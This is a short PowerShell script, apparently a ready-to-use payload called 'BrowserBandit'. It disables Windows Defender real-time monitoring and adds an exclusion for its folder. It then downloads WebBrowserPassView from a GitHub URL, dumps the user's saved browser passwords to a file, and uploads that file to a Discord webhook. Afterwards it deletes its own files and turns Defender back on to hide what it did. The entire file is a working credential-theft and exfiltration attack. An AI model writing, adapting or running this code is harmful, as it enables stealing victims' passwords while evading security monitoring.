# Define variables
$dir = "C:/BrowserBandit"
$exePath = "$dir/WebBrowserPassView.exe"
$outputFile = "$env:UserName-passwords.txt"
$srcUrl = "https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/WebBrowserPassView.exe?token=GHSAT0AAAAAACXIFIYHTBAFBUCCSI52SSN6ZXBQYFA"
$discordWebhook = "<DISCORDWEBHOOK HERE>"

# Create directory and disable real-time monitoring
mkdir $dir
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -ExclusionPath $dir

# Download the WebBrowserPassView executable
Invoke-WebRequest $srcUrl -OutFile $exePath

# Run the executable and save the output to a text file
Set-Location "C:/fileUp"
& $exePath /stext $outputFile

# Upload the file to Discord
curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@$outputFile" $discordWebhook

# Clean up
Remove-Item $exePath, $outputFile
cd ..
Remove-Item "C:/fileUp"
Remove-Item "$env:temp\BrowserBandit.ps1"

# Re-enable real-time monitoring and exit
Set-MpPreference -DisableRealtimeMonitoring 0
Set-MpPreference -ExclusionPath $dir -Remove
exit
